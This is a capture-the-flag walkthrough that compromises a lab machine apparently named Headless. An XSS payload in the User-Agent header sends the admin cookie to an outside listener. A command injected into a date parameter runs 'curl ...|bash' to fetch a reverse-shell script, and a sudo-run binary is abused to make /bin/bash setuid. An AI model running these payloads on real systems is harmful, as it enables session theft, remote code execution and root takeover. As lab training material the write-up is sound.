![](https://i.imgur.com/TsLIrgv.png)

So for starters we are going to start with the initial reconnaissance.  it is crucial to gather information about the target machine before proceeding with further exploitation
```bash
$ nmap 10.10.11.8 -sC 

Host is up (1.4s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp  open     upnp
49153/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 810.66 seconds

```
So we acknowledge 2 open ports that’ s 22/tcp open ssh and 5000/tcp open upnp which seems interesting so lets dig in.
![](https://i.imgur.com/5FFAOT6.png)
upon clicking the `For question` button i was directed to the `/support` directory
![](https://i.imgur.com/rCkQXPM.png)

the `/support` directory is the only page the webserver referred to so i decide to fuzz for directories:
```bash
dirsearch -u http://10.10.11.8:5000/ --exclude-status 403,404,400,401 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
and that's how we discovered another endpoint `/dashboard`, but when we visit `/dashboard` we get an unauthorized  error meaning we probably don't have the rights and privileges to access this page on the system
![](https://i.imgur.com/ZSDSPe0.png)
at this point i load up burpsuite to see what is being transferred **behind the screen**. i went back to the only accessible page `/support` , fill the form and intercept my request
![](https://i.imgur.com/M2mVC7I.png)
From the request i see that the webserver is using cookies to verify if a user is admin or not  to access the dashboard
![](https://i.imgur.com/1BRIt3B.png)
this cookie segmentation process can be done through XSS on User-Agent through the page we can access which is `/support` .
i intercept the request again but before sending i added my malicious XSS payload to retrieve the Admins cookie.
![](https://i.imgur.com/Df35kuf.png)

```
<img src=x onerror=fetch('http://10.10.14.111:1337/'+document.cookie);>
```

![](https://i.imgur.com/mmV8W47.png)
and boom i got a hit from my server
![](https://i.imgur.com/GUties7.png)

i then copied the cookie and inspect the `/dashboard` page from my browsers and i edited the cookie parameter to the one i just stole from the webserver
![](https://i.imgur.com/I61bKIO.png)

checking what going on behind the screen:
![](https://i.imgur.com/9NSUTAZ.png)
i intercept the response of the `/dashboard` page and we are a to send a post request of the date but with an exploit so that we can gain RCE 

```bash
#!/bin/bash
/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.14.111/7331 0>&1'
#edit the IP
```

![](https://i.imgur.com/xhZULm3.png)

![](https://i.imgur.com/d5JoRof.png)
on the dashboard i intercept the request and clicked the generate report button
![](https://i.imgur.com/r4Nflle.png)
then i append this command to the end of the date parameter to force the server to download the formerly created malicious file and executeit
```bash
;curl http://10.10.14.111:1337/headless.sh|bash
```

![](https://i.imgur.com/OVdJE1r.png)
file download :
![](https://i.imgur.com/v1AosSf.png)
main Connection:
![](https://i.imgur.com/2Uf3tlW.png)

Now i will have to escalate my privilege to root
i run `sudo -l` and found out that the current user can run the `syscheck` binary with NOPASSWORD
![](https://i.imgur.com/zNoeypv.png)

![](https://i.imgur.com/VVGLfJB.png)
we can see`initdb.sh` is launched, so we just need to create and put malicious payload in it as follows.
```bash
echo "chmod u+s /bin/bash" > initdb.sh
chmod +x initdb.sh
```
![](https://i.imgur.com/O6c3BrG.png)

then run `/usr/bin/syscheck` with sudo privileges in the same folder that holds the `initdb.sh `then `/bin/bash -p` to access the root shell
```bash
sudo /usr/bin/syscheck
/bin/bash -p
```
![](https://i.imgur.com/KgQ96cN.png)

## Thanks For Reading
